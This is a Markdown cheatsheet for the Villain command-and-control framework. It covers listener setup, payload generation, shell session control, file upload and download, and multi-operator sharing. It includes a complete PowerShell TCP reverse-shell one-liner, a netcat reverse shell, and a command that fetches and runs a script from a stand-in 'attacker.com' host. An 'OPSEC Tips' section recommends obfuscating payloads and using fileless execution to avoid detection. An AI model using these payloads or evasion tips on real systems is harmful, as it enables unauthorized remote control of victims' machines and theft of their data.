# Villain Cheatsheet

## Quick Reference

### Starting Villain

```bash
# Start with default settings
sudo villain

# Start with custom ports
sudo villain -p 6501 -x 8080 -n 4443 -f 8888

# Port configuration:
# -p: Team server port (default: 6501)
# -x: HoaxShell server port (default: 8080)
# -n: Reverse TCP multi-handler port (default: 4443)
# -f: File Smuggler port (default: 8888)
```

### Payload Generation

```bash
# Via console:
Villain > generate

# Select payload type:
# 1. HoaxShell (HTTP)
# 2. HoaxShell (HTTPS)
# 3. Reverse TCP (PowerShell)
# 4. Reverse TCP (netcat)
# 5. Custom template

# Copy generated payload and execute on target
```

### Session Management

```bash
# List sessions
Villain > sessions

# Interact with session
Villain > shell <session_id>

# Switch sessions
Villain > shell <session_id1>
Villain > shell <session_id2>

# Background session
Villain > background

# Kill session
Villain > kill <session_id>
```

### Shell Commands

```bash
# Once in a shell session:
Villain (session: <id>) > whoami
Villain (session: <id>) > hostname
Villain (session: <id>) > ipconfig
Villain (session: <id>) > dir C:\Users
Villain (session: <id>) > systeminfo
```

### File Operations

```bash
# Upload file
Villain (session: <id>) > upload /path/to/local/file C:\temp\remote_file

# Download file
Villain (session: <id>) > download C:\Users\target\file.txt /path/to/local/file.txt

# List files
Villain (session: <id>) > ls C:\Users

# Create directory
Villain (session: <id>) > mkdir C:\temp\new_folder
```

### Fileless Script Execution

```bash
# Execute PowerShell script in memory
Villain (session: <id>) > fileless_ps <script_content>

# Execute script from URL
Villain (session: <id>) > fileless_ps_url http://attacker.com/script.ps1

# Execute script from file
Villain (session: <id>) > fileless_ps_file /path/to/script.ps1
```

### ConPtyShell Integration

```bash
# Automatically invoked for PowerShell reverse shells
# Provides fully interactive Windows shell with:
# - Tab completion
# - Arrow key navigation
# - Ctrl+C support
# - Proper terminal emulation

# Manual invocation:
Villain (session: <id>) > conpty
```

### Multiplayer Mode

```bash
# Connect to sibling server
Villain > sibling <server_ip> <port>

# Share shells
Villain > share <session_id> <sibling_ip>

# View shared shells
Villain > shared_sessions

# List siblings
Villain > siblings

# Disconnect sibling
Villain > unsibling <sibling_ip>
```

### Session Defender

```bash
# Enable Session Defender
Villain > session_defender on

# Disable Session Defender
Villain > session_defender off

# Session Defender inspects:
# - Commands that may hang the shell
# - Dangerous commands
# - Mistyped commands
```

### File Smuggler

```bash
# Access file smuggler
# URL: http://<your_ip>:8888

# Upload files via HTTP
# Use browser or curl to upload files to target

# Download files from target
# Files are served through the file smuggler
```

### Custom Payload Templates

```bash
# Create custom templates:
# Place in Villain/Core/payload_templates/

# Template variables:
# {{SERVER_IP}} - Server IP address
# {{SERVER_PORT}} - Server port
# {{SESSION_ID}} - Unique session ID

# Example template:
# $ip = "{{SERVER_IP}}"
# $port = "{{SERVER_PORT}}"
# ... (payload code)
```

### Sibling Server Communication

```bash
# Start sibling server on another machine
sudo villain -p 6501

# Connect from main server
Villain > sibling <sibling_ip> 6501

# Verify connection
Villain > siblings

# Share shells with sibling
Villain > share <session_id> <sibling_ip>
```

### Session Information

```bash
# View session details
Villain > session_info <session_id>

# Output includes:
# - Session ID
# - Target IP
# - Target OS
# - User context
# - Session type
# - Connection status
```

### Custom Commands

```bash
# Execute custom command
Villain (session: <id>) > custom <command>

# Execute PowerShell command
Villain (session: <id>) > ps <command>

# Execute CMD command
Villain (session: <id>) > cmd <command>
```

### OPSEC Tips

```bash
# Obfuscate payloads
# Use Invoke-Obfuscation or manual techniques

# Use HTTPS with trusted certs
Villain > generate
# Select: HoaxShell (HTTPS)

# Set realistic sleep intervals
# Modify payload template

# Use fileless execution
Villain (session: <id>) > fileless_ps <script>

# Monitor for detection
# Check agent status regularly
```

### Common Payload Templates

```bash
# PowerShell reverse shell:
# $client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Netcat reverse shell:
# nc -e /bin/bash <IP> <PORT>
```

### Troubleshooting

```bash
# Villain won't start
python3 --version
pip3 install -r requirements.txt
netstat -tlnp | grep 6501
which gnome-terminal

# Payload doesn't connect
# Check: listener running, IP/port correct, firewall rules

# Shell hangs
# Use: session_defender
# Avoid: interactive commands

# ConPtyShell fails
# Check: target is Windows, PowerShell available

# Sibling connection fails
# Check: sibling server running, firewall rules, IP/port
```

### Port Configuration

```bash
# Default ports:
# Team server: 6501
# HoaxShell: 8080 (HTTP) / 443 (HTTPS)
# Reverse TCP: 4443
# File Smuggler: 8888

# Custom configuration:
sudo villain -p 6501 -x 8080 -n 4443 -f 8888

# HTTPS mode:
sudo villain -c cert.pem -k key.pem
```

### Session Types

```bash
# HoaxShell-based:
# - HTTP/HTTPS pseudo-shell
# - Beacon-like communication
# - Limited interactivity

# Reverse TCP:
# - Traditional reverse shell
# - PowerShell or netcat
# - Basic functionality

# ConPtyShell:
# - Fully interactive Windows shell
# - Tab completion
# - Arrow key navigation
```

### File Smuggler Usage

```bash
# Upload file via curl
curl -X POST http://<your_ip>:8888/upload -F "file=@/path/to/file"

# Download file via curl
curl -O http://<your_ip>:8888/download/<filename>

# Browse files via browser
# Navigate to http://<your_ip>:8888
```
